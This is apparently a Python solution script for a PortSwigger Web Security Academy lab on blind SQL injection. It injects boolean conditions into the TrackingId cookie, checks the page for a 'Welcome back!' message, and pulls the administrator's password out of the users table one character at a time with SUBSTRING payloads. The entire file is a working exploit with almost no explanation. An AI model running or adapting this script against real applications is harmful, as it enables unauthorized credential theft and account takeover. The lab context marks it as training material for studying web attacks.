import requests
import string
import urllib3

urllib3.disable_warnings()

# =========================
# CONFIG
# =========================
TARGET_URL = "https://0a2800e104a0b50781748e0f0089005d.web-security-academy.net/"
SESSION_COOKIE = "le4oPMM3sbBdCpNltxUh2Fl9uvukuSsJ"
TRACKING_ID = "Q4L4ylz0VtClOzyp"

CHARSET = string.ascii_lowercase + string.digits
# CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits
MAX_LEN = 30
print(f"charset: {CHARSET}")
# =========================
# REQUEST
# =========================
def send_payload(payload):
    cookies = {
        "TrackingId": TRACKING_ID + payload,
        "session": SESSION_COOKIE
    }

    r = requests.get(TARGET_URL, cookies=cookies, verify=False)
    return "Welcome back!" in r.text


# =========================
# BASELINE
# =========================
print("[*] Testing condition...")

true_payload = "' AND 1=1-- "
false_payload = "' AND 1=2-- "

if not send_payload(true_payload):
    print("[!] TRUE condition failed")
    exit()

if send_payload(false_payload):
    print("[!] FALSE condition failed")
    exit()

print("[+] Boolean-based SQLi confirmed")

# =========================
# DUMP PASSWORD
# =========================
password = ""

print("[*] Dumping password...")

for position in range(1, MAX_LEN + 1):
    found = False

    for char in CHARSET:
        payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'-- "

        if send_payload(payload):
            password += char
            print(f"[+] Found char {position}: {char}")
            found = True
            break

    if not found:
        print("[*] End of password reached.")
        break

print(f"\n PASSWORD: {password}")